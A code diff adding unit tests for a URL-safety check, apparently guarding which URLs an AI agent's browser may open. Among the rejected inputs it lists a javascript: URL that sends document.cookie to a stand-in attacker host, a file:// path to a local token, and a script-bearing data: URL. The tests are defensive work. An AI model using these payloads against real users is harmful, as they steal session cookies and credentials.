@@ -4,7 +4,7 @@
 
 import dns from "node:dns/promises";
 import { afterEach, describe, expect, it, vi } from "vitest";
-import { isAlwaysBlockedUrl, isSafeUrl } from "./url-safety.js";
+import { isAlwaysBlockedUrl, isSafeUrl, unsafeBrowserUrl } from "./url-safety.js";
 
 function mockLookup(addresses: Array<{ address: string; family: number }>): void {
     vi.spyOn(dns, "lookup").mockResolvedValue(addresses as never);
@@ -139,5 +139,21 @@ describe("isSafeUrl — DNS resolution", () => {
         const r = await isSafeUrl("https://nonexistent.example.com/");
         expect(r.safe).toBe(false);
         expect(r.reason).toMatch(/DNS lookup failed/);
+    });
+});
+
+describe("unsafeBrowserUrl: every way the agent opens a URL", () => {
+    it("allows web pages and the blank page only", () => {
+        expect(unsafeBrowserUrl("https://example.com/a?b=1")).toBeNull();
+        expect(unsafeBrowserUrl("http://localhost:3000")).toBeNull(); // dev servers in coding demos
+        expect(unsafeBrowserUrl("about:blank")).toBeNull();
+        for (const bad of [
+            "file:///Users/me/.atlas/overlay-local-token",
+            "javascript:fetch('https://evil.example/?c='+document.cookie)",
+            "data:text/html,<script>alert(1)</script>",
+            "chrome://settings",
+        ])
+            expect(unsafeBrowserUrl(bad), bad).toMatch(/unsafe URL scheme/);
+        expect(unsafeBrowserUrl("not a url")).toMatch(/invalid url/);
     });
 });
